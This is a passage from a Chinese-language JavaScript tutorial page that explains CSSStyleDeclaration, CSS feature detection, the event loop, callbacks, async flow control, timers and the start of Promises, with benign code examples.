title="CSS操作"></a>CSS操作</h2><p>操作css样式：使用网页元素节点的**<code>getAttribute()</code><strong>方法、</strong><code>setAttribute()</code><strong>方法和</strong><code>removeAttribute()</code><strong>方法，直接读写&#x2F;删除网页元素的</strong>style**属性。</p><h3 id="CSSStyleDeclaration-接口"><a href="#CSSStyleDeclaration-接口" class="headerlink" title="CSSStyleDeclaration 接口"></a>CSSStyleDeclaration 接口</h3><p>该接口用于<strong>操作元素的样式</strong>，可直接读写CSS的样式属性。</p><p>三个地方部署了该接口：</p><ul><li>元素节点的<code>style</code>属性（<code>Element.style</code>）<ul><li><code>Element.style</code>返回的只是行内样式，并不是该元素的全部样式。全部样式通过<code>window.getComputedStyle()</code>获得，</li></ul></li><li><code>CSSStyle</code>实例的<code>style</code>属性</li><li><code>window.getComputedStyle()</code>的返回值</li></ul><h4 id="实例属性"><a href="#实例属性" class="headerlink" title="实例属性"></a>实例属性</h4><ul><li><p>CSSStyleDeclaration.<strong>cssText</strong> —— <strong>读写</strong>当前规则的所有样式声明文本</p></li><li><p>CSSStyleDeclaration.<strong>length</strong> —— 返回整数值。表示当前规则中的<strong>样式声明条数</strong>。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> myDiv = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;myDiv&#x27;</span>);<br><span class="hljs-keyword">var</span> divStyle = myDiv.<span class="hljs-property">style</span>;<br>divStyle.<span class="hljs-property">length</span><br></code></pre></td></tr></table></figure></li><li><p>CSSStyleDeclaration.<strong>parentRule</strong> —— 返回当前规则所属的那个样式块（CSSRule 实例）</p></li></ul><h4 id="实例方法-1"><a href="#实例方法-1" class="headerlink" title="实例方法"></a>实例方法</h4><ul><li>CSSStyleDeclaration.<strong>getPropertyPriority()</strong> —— 是否设置<strong>important优先级</strong><ul><li>若设置，返回<code>&quot;importent&quot;</code></li><li>若无，返回空字符串</li></ul></li><li>CSSStyleDeclaration.<strong>getPropertyValue()</strong> —— 该属性的<strong>属性值</strong><ul><li>例如<code>style.getPropertyValue(&quot;margin&quot;)</code></li></ul></li><li>CSSStyleDeclaration.<strong>item()</strong> —— 该位置的css属性名</li><li>CSSStyleDeclaration.<strong>removeProperty()</strong> —— 移除该属性</li><li>CSSStyleDeclaration.<strong>setProperty()</strong> —— 设置新的CSS样式<ul><li>参数1：属性名</li><li>参数2（可选）：属性值</li><li>参数3（可选）：优先级<ul><li>唯一的合法值：<code>important</code></li></ul></li></ul></li></ul><h3 id="CSS模块侦测"><a href="#CSS模块侦测" class="headerlink" title="CSS模块侦测"></a>CSS模块侦测</h3><p>不同浏览器对CSS模块的支持不同，想要知道是否支持某个模块，就要进行CSS模块的侦测。</p><p>普遍方法：判断元素的<code>style</code>对象的某个属性值是否为字符串。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">typeof</span> element.<span class="hljs-property">style</span>.<span class="hljs-property">animationName</span> === <span class="hljs-string">&#x27;string&#x27;</span>;<br><span class="hljs-keyword">typeof</span> element.<span class="hljs-property">style</span>.<span class="hljs-property">transform</span> === <span class="hljs-string">&#x27;string&#x27;</span>;<br></code></pre></td></tr></table></figure><p>若该CSS属性存在，则会返回一个字符串。未设置返回空字符串。</p><p>若不存在，返回undefined（意味着不支持）。</p><p>这种侦测方式可以写成一个函数：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">isPropertySupported</span>(<span class="hljs-params">property</span>) &#123;<br>  <span class="hljs-keyword">if</span> (property <span class="hljs-keyword">in</span> <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-property">style</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>  <span class="hljs-keyword">var</span> prefixes = [<span class="hljs-string">&#x27;Moz&#x27;</span>, <span class="hljs-string">&#x27;Webkit&#x27;</span>, <span class="hljs-string">&#x27;O&#x27;</span>, <span class="hljs-string">&#x27;ms&#x27;</span>, <span class="hljs-string">&#x27;Khtml&#x27;</span>];<br>  <span class="hljs-keyword">var</span> prefProperty = property.<span class="hljs-title function_">charAt</span>(<span class="hljs-number">0</span>).<span class="hljs-title function_">toUpperCase</span>() + property.<span class="hljs-title function_">substr</span>(<span class="hljs-number">1</span>);<br><br>  <span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; prefixes.<span class="hljs-property">length</span>; i++)&#123;<br>    <span class="hljs-keyword">if</span>((prefixes[i] + prefProperty) <span class="hljs-keyword">in</span> <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-property">style</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>  &#125;<br><br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br><br><span class="hljs-title function_">isPropertySupported</span>(<span class="hljs-string">&#x27;background-clip&#x27;</span>)<br><span class="hljs-comment">// true</span><br></code></pre></td></tr></table></figure><h3 id="CSS对象"><a href="#CSS对象" class="headerlink" title="CSS对象"></a>CSS对象</h3><p>浏览器原生提供CSS对象，该对象目前有两个静态方法。</p><h4 id="CSS-escape"><a href="#CSS-escape" class="headerlink" title="CSS.escape()"></a>CSS.escape()</h4><p>用于转义CSS选择器的特殊字符。</p><h4 id="CSS-supports"><a href="#CSS-supports" class="headerlink" title="CSS.supports()"></a>CSS.supports()</h4><p>返回一个布尔值，表示当前环境是否支持某一句 CSS 规则。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// 第一种写法</span><br><span class="hljs-variable constant_">CSS</span>.<span class="hljs-title function_">supports</span>(<span class="hljs-string">&#x27;transform-origin&#x27;</span>, <span class="hljs-string">&#x27;5px&#x27;</span>) <span class="hljs-comment">// true</span><br><br><span class="hljs-comment">// 第二种写法（css语句结尾不能带分号）</span><br><span class="hljs-variable constant_">CSS</span>.<span class="hljs-title function_">supports</span>(<span class="hljs-string">&#x27;display: table-cell&#x27;</span>) <span class="hljs-comment">// true</span><br></code></pre></td></tr></table></figure><h1 id="事件"><a href="#事件" class="headerlink" title="事件"></a>事件</h1><h1 id="异步"><a href="#异步" class="headerlink" title="异步"></a>异步</h1><p>浏览器按照书写代码的顺序执行，它会等待代码的解析和工作，完成上一条再执行下一条，每一条新的代码都建立在前面代码的基础之上。</p><p>这种完成上一操作再执行下一操作的编程模型，叫做<strong>同步编程</strong>。</p><p>例如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">makeGreeting</span>(<span class="hljs-params">name</span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-string">`Hello, my name is <span class="hljs-subst">$&#123;name&#125;</span>!`</span>;<br>&#125;<br><span class="hljs-keyword">const</span> name = <span class="hljs-string">&quot;Miriam&quot;</span>;<br><span class="hljs-keyword">const</span> greeting = <span class="hljs-title function_">makeGreeting</span>(name);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(greeting);<br><span class="hljs-comment">// &quot;Hello, my name is Miriam!&quot;</span><br></code></pre></td></tr></table></figure><p>这是一个<strong>同步程序</strong>，makeGreeting()是一个<strong>同步函数</strong>。在函数返回之前，调用者必须等待函数完成其工作。</p><p>但若是一个同步函数需要很长时间，就会影响到其他事件的正常运行（例如在做大体量计算时，想要同时输入文本框，会因为计算未完成而无法进行）。</p><p>想要解决这一问题，就要使用异步。</p><h2 id="1-单线程模型"><a href="#1-单线程模型" class="headerlink" title="1.单线程模型"></a>1.单线程模型</h2><p>JavaScript是<strong>单线程</strong>运行，同时只能执行一个任务（但JavaScript引擎可以有多个线程）。</p><p>单线程模式的优点是实现简单、执行环境相对单纯；缺点是若某个任务耗时很长，会拖延整个程序的执行。例如常见的浏览器无响应，往往就是因为某一段JavaScript代码长时间运行导致整个页面卡住。</p><p>且很多时候并不是因为数据量大，CPU执行不过来。而是因为IO（输入输出）操作过慢，CPU甚至在空闲等待读取数据的结果。</p><p>JavaScript的语言设计者意识到，可以让CPU不管IO操作，挂起处于等待中的任务，先运行排在后面的任务。等IO操作返回了结果，再把挂起的任务继续执行下去。该机制被称为<strong>“事件循环”机制</strong>（Event Loop）。</p><ul><li>“<strong>事件循环是一个程序结构，用于等待和发送消息和事件</strong>（a programming construct that waits for and dispatches events or messages in a program）”</li><li>只要同步任务执行完了，引擎就会去检查那些挂起来的异步任务，是不是可以进入主线程了。</li></ul><p>为了利用多核 CPU 的计算能力，HTML5 提出 Web Worker 标准，允许 JavaScript 脚本创建多个线程，但是子线程完全受主线程控制，且不得操作 DOM。所以，这个新标准并没有改变 JavaScript 单线程的本质。</p><h2 id="2-同步任务和异步任务"><a href="#2-同步任务和异步任务" class="headerlink" title="2.同步任务和异步任务"></a>2.同步任务和异步任务</h2><p>程序里的所有任务，可以被分为两类：<strong>同步任务（synchronous）</strong>和<strong>异步任务（asynchronous）</strong>。</p><ul><li><p><strong>同步任务</strong></p><p>那些<strong>没有被引擎挂起、在主线程上排队</strong>的任务。</p><p>只有前一个任务执行完毕，才能执行后一个任务。</p></li><li><p><strong>异步任务</strong></p><p>那些<strong>被引擎放在一边，不进入主线程、而进入任务队列</strong>的任务。</p><p>只有引擎认为某个异步任务可以执行了（比如 Ajax 操作从服务器得到了结果），该任务（采用回调函数的形式）才会进入主线程执行。</p><p>排在异步任务后面的代码，不用等待异步任务结束会马上运行，也就是说，异步任务不具有“堵塞”效应。</p></li></ul><h2 id="3-任务队列和事件循环"><a href="#3-任务队列和事件循环" class="headerlink" title="3.任务队列和事件循环"></a>3.任务队列和事件循环</h2><p>JavaScript运行时，除了当前运行的主程序，引擎还提供<strong>任务队列</strong>（task queue），里面是各种需要当前程序处理的异步任务。</p><p>首先，主线程会去执行所有的同步任务。</p><p>等到同步任务全部执行完，就会去看任务队列里面的异步任务。</p><p>如果满足条件，那么异步任务就重新进入主线程开始执行，这时它就变成同步任务了。</p><p>等到执行完，下一个异步任务再进入主线程开始执行。一旦任务队列清空，程序就结束执行。</p><p>异步任务的写法通常是回调函数。</p><h2 id="4-异步操作的模式"><a href="#4-异步操作的模式" class="headerlink" title="4.异步操作的模式"></a>4.异步操作的模式</h2><h3 id="4-1-回调函数"><a href="#4-1-回调函数" class="headerlink" title="4.1 回调函数"></a>4.1 回调函数</h3><p>异步操作最基本的方法。</p><p>回调函数是一个被传递到另一个函数中、会在适当的时候被调用的函数。</p><p>例子：两个函数f1、f2，f2在f1后执行。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">f1</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-comment">// ...</span><br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">f2</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-comment">// ...</span><br>&#125;<br><br><span class="hljs-title function_">f1</span>();<br><span class="hljs-title function_">f2</span>();<br></code></pre></td></tr></table></figure><p>但若是f1为异步操作，f2会直接执行，而不是等待f1结束。</p><p>这时候可以考虑把f2写成f1的回调函数。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">f1</span>(<span class="hljs-params">callback</span>) &#123;<br>  <span class="hljs-comment">// ...</span><br>  <span class="hljs-title function_">callback</span>();<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">f2</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-comment">// ...</span><br>&#125;<br><br><span class="hljs-title function_">f1</span>(f2);<br></code></pre></td></tr></table></figure><p><strong>优点</strong>：<strong>简单、容易理解和实现</strong></p><p><strong>缺点</strong>：<strong>不利于代码的阅读和维护</strong>，各个部分之间高度耦合。有时可能还会出现”回调地狱（callback hell）” 或 “厄运金字塔（pyramid of doom）”（缩进看起来像是金字塔的侧面）</p><h3 id="4-2-事件监听"><a href="#4-2-事件监听" class="headerlink" title="4.2 事件监听"></a>4.2 事件监听</h3><p>异步任务的执行不取决于代码的顺序，而取决于某个事件是否发生。</p><p>例如（案例为JQuery写法）：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">f1</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-built_in">setTimeout</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-comment">// ...</span><br>    f1.<span class="hljs-title function_">trigger</span>(<span class="hljs-string">&#x27;done&#x27;</span>); <span class="hljs-comment">//执行完成后，立即触发done事件</span><br>  &#125;, <span class="hljs-number">1000</span>);<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">f2</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-comment">// ...</span><br>&#125;<br><br><br>f1.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;done&#x27;</span>, f2); <span class="hljs-comment">//当f1发生done事件，就执行f2</span><br></code></pre></td></tr></table></figure><p><strong>优点</strong>：易理解，可绑定多个事件，每个事件可以指定多个回调函数，可以去耦合，有利于实现模块化。</p><p><strong>缺点</strong>：整个程序都变成事件驱动型，运行流程不清晰，阅读代码较困难</p><h3 id="4-3-发布-x2F-订阅"><a href="#4-3-发布-x2F-订阅" class="headerlink" title="4.3 发布&#x2F;订阅"></a>4.3 发布&#x2F;订阅</h3><p>事件完全可以理解成“信号”，如果存在一个“信号中心”，某个任务执行完成，就向信号中心“发布”（publish）一个信号，其他任务可以向信号中心“订阅”（subscribe）这个信号，从而知道什么时候自己可以开始执行。这就叫做”<a href="https://en.wikipedia.org/wiki/Publish-subscribe_pattern">发布&#x2F;订阅模式</a>”（publish-subscribe pattern），又称“<a href="https://en.wikipedia.org/wiki/Observer_pattern">观察者模式</a>”（observer pattern）。</p><p>该模式有多重实现方式。</p><h2 id="5-异步操作的流程控制"><a href="#5-异步操作的流程控制" class="headerlink" title="5.异步操作的流程控制"></a>5.异步操作的流程控制</h2><p>假如有6个异步任务，一个需要耗时1s，全部完成后才能执行最后的final函数。要如何安排操作流程。</p><ul><li><p><strong>串行执行</strong></p><p>编写一个流程控制函数，让它来控制异步任务，一个任务完成以后，再执行另一个。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> items = [ <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span> ];<br><span class="hljs-keyword">var</span> results = [];<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">async</span>(<span class="hljs-params">arg, callback</span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;参数为 &#x27;</span> + arg +<span class="hljs-string">&#x27; , 1秒后返回结果&#x27;</span>);<br>  <span class="hljs-built_in">setTimeout</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123; <span class="hljs-title function_">callback</span>(arg * <span class="hljs-number">2</span>); &#125;, <span class="hljs-number">1000</span>);<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">final</span>(<span class="hljs-params">value</span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;完成: &#x27;</span>, value);<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">series</span>(<span class="hljs-params">item</span>) &#123;<br>  <span class="hljs-comment">//series就是串行函数。依次执行完异步任务，确保完成后再执行final函数。</span><br>  <span class="hljs-keyword">if</span>(item) &#123;<br>    <span class="hljs-title function_">async</span>( item, <span class="hljs-keyword">function</span>(<span class="hljs-params">result</span>) &#123;<br>      results.<span class="hljs-title function_">push</span>(result);<br>      <span class="hljs-keyword">return</span> <span class="hljs-title function_">series</span>(items.<span class="hljs-title function_">shift</span>());<br>    &#125;);<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_">final</span>(results[results.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>]);<br>  &#125;<br>&#125;<br><br><span class="hljs-title function_">series</span>(items.<span class="hljs-title function_">shift</span>()); <br><span class="hljs-comment">//Array.prototype.shift()方法，删除数组的第一个元素，返回该元素</span><br></code></pre></td></tr></table></figure><p>需要6秒。</p></li><li><p><strong>并行执行</strong></p><p>所有异步任务同时执行，等到全部完成以后，才执行<code>final</code>函数。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> items = [ <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span> ];<br><span class="hljs-keyword">var</span> results = [];<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">async</span>(<span class="hljs-params">arg, callback</span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;参数为 &#x27;</span> + arg +<span class="hljs-string">&#x27; , 1秒后返回结果&#x27;</span>);<br>  <span class="hljs-built_in">setTimeout</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123; <span class="hljs-title function_">callback</span>(arg * <span class="hljs-number">2</span>); &#125;, <span class="hljs-number">1000</span>);<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">final</span>(<span class="hljs-params">value</span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;完成: &#x27;</span>, value);<br>&#125;<br><br>items.<span class="hljs-title function_">forEach</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">item</span>) &#123;<br>  <span class="hljs-comment">//6个异步任务同时执行</span><br>  <span class="hljs-title function_">async</span>(item, <span class="hljs-keyword">function</span>(<span class="hljs-params">result</span>)&#123;<br>    results.<span class="hljs-title function_">push</span>(result);<br>    <span class="hljs-keyword">if</span>(results.<span class="hljs-property">length</span> === items.<span class="hljs-property">length</span>) &#123;<br>      <span class="hljs-title function_">final</span>(results[results.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>]);<br>    &#125;<br>  &#125;)<br>&#125;);<br><br></code></pre></td></tr></table></figure><p>1秒。</p><p>但并行任务过多时，很容易耗尽系统资源，拖慢运行速度。</p></li><li><p><strong>串行并行结合</strong></p><p>所谓并行与串行的结合，就是设置一个门槛，每次最多只能并行执行<code>n</code>个异步任务，这样就避免了过分占用系统资源。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> items = [ <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span> ];<br><span class="hljs-keyword">var</span> results = [];<br><span class="hljs-keyword">var</span> running = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">var</span> limit = <span class="hljs-number">2</span>; <span class="hljs-comment">//限制最多运行2个异步任务</span><br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">async</span>(<span class="hljs-params">arg, callback</span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;参数为 &#x27;</span> + arg +<span class="hljs-string">&#x27; , 1秒后返回结果&#x27;</span>);<br>  <span class="hljs-built_in">setTimeout</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123; <span class="hljs-title function_">callback</span>(arg * <span class="hljs-number">2</span>); &#125;, <span class="hljs-number">1000</span>);<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">final</span>(<span class="hljs-params">value</span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;完成: &#x27;</span>, value);<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">launcher</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">while</span>(running &lt; limit &amp;&amp; items.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-keyword">var</span> item = items.<span class="hljs-title function_">shift</span>();<br>    <span class="hljs-title function_">async</span>(item, <span class="hljs-keyword">function</span>(<span class="hljs-params">result</span>) &#123;<br>      results.<span class="hljs-title function_">push</span>(result);<br>      running--;<br>      <span class="hljs-keyword">if</span>(items.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-title function_">launcher</span>();<br>      &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(running === <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-title function_">final</span>(results);<br>      &#125;<br>    &#125;);<br>    running++;<br>  &#125;<br>&#125;<br><br><span class="hljs-title function_">launcher</span>();<br></code></pre></td></tr></table></figure></li></ul><h2 id="6-定时器"><a href="#6-定时器" class="headerlink" title="6.定时器"></a>6.定时器</h2><p>JavaScript提供定时执行代码的功能，叫做定时器（timer）。</p><p>主要由**setTimeout()<strong>和</strong>setInterval()**这两个函数来完成。它们向任务队列添加定时任务。</p><ul><li><p><strong>setTimeout()</strong></p><p>用来指定某个函数或某段代码，在多少毫秒之后执行。它返回一个整数，表示定时器的编号，以后可以用来取消这个定时器。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> timerId = <span class="hljs-built_in">setTimeout</span>(func|code, delay);<br><span class="hljs-comment">//setTimeout(functionRef, delay, param1, param2, /* … ,*/ paramN)</span><br></code></pre></td></tr></table></figure><ul><li><code>func|code</code>是将要推迟执行的函数名或者一段代码<ul><li>不建议直接些code，会有安全风险</li></ul></li><li><code>delay</code>是推迟执行的毫秒数（可选）。</li><li><code>paramN</code>附加参数，一旦定时器到期，它们会作为参数传递给 <code>functionRef</code> 指定的函数。</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> x = <span class="hljs-number">1</span>;<br><br><span class="hljs-keyword">var</span> obj = &#123;<br>  <span class="hljs-attr">x</span>: <span class="hljs-number">2</span>,<br>  <span class="hljs-attr">y</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">x</span>);<br>  &#125;<br>&#125;;<br><br><span class="hljs-built_in">setTimeout</span>(obj.<span class="hljs-property">y</span>, <span class="hljs-number">1000</span>) <span class="hljs-comment">// 1</span><br><span class="hljs-comment">//输出为1，而不是2，因为1000毫秒后，this所指的不是obj，而是全局变量</span><br><br><span class="hljs-built_in">setTimeout</span>(obj.<span class="hljs-property">y</span>.<span class="hljs-title function_">bind</span>(obj), <span class="hljs-number">1000</span>)<br><span class="hljs-comment">// 2</span><br></code></pre></td></tr></table></figure></li><li><p><strong>setInterval()</strong></p><p>用法与setTimeout完全一致。</p><p>区别仅仅在于setInterval指定<strong>某个任务每隔一段时间就执行一次</strong>，也就是无限次的定时执行。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> intervalID = <span class="hljs-built_in">setInterval</span>(func, [delay, arg1, arg2, ...]);<br><span class="hljs-keyword">var</span> intervalID = <span class="hljs-built_in">setInterval</span>(<span class="hljs-keyword">function</span>[, delay]);<br><span class="hljs-keyword">var</span> intervalID = <span class="hljs-built_in">setInterval</span>(code, [delay]);<br></code></pre></td></tr></table></figure></li><li><p><strong>clearTimeout()，clearInterval()</strong></p><p>setTimeout和setInterval函数，都<strong>返回一个整数值</strong>，表示<strong>计数器编号</strong>。</p><p>将该整数传入<strong>clearTimeout</strong>和<strong>clearInterval</strong>函数，就可以<strong>取消对应的定时器</strong>。</p><p>setTimeout和setInterval返回的整数值是连续的，可以根据这一点，编写函数取消当前所有的定时器。</p></li></ul><p><strong>setTimeout</strong>和<strong>setInterval</strong>指定的回调函数，必须等到本轮事件循环的所有同步任务都执行完，才会开始执行。但它们只能指定delay，并不能确保任务在时间内完成，若任务运行时间很长，在delay时间内无法结束，那只能继续等待它完成。</p><h2 id="7-Promise-对象"><a href="#7-Promise-对象" class="headerlink" title="7.Promise 对象"></a>7.Promise 对象</h2><blockquote><p><strong>Promise</strong> 是现代 JavaScript 中异步编程的基础，是一个由异步函数返回的可以向我们指示当前操作所处的状态的对象。在 Promise 返回给调用者的时候，操作往往还没有完成，但 Promise 对象可以让我们操作最终完成时对其进行处理（无论成功还是失败）。</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> myPromise = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">if</span>(condition here) &#123;<br>    <span class="hljs-title function_">resolve</span>(<span class="hljs-string">&quot;Promise was fulfilled&quot;</span>);<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_">reject</span>(<span class="hljs-string">&quot;Promise was rejected&quot;</span>);<br>  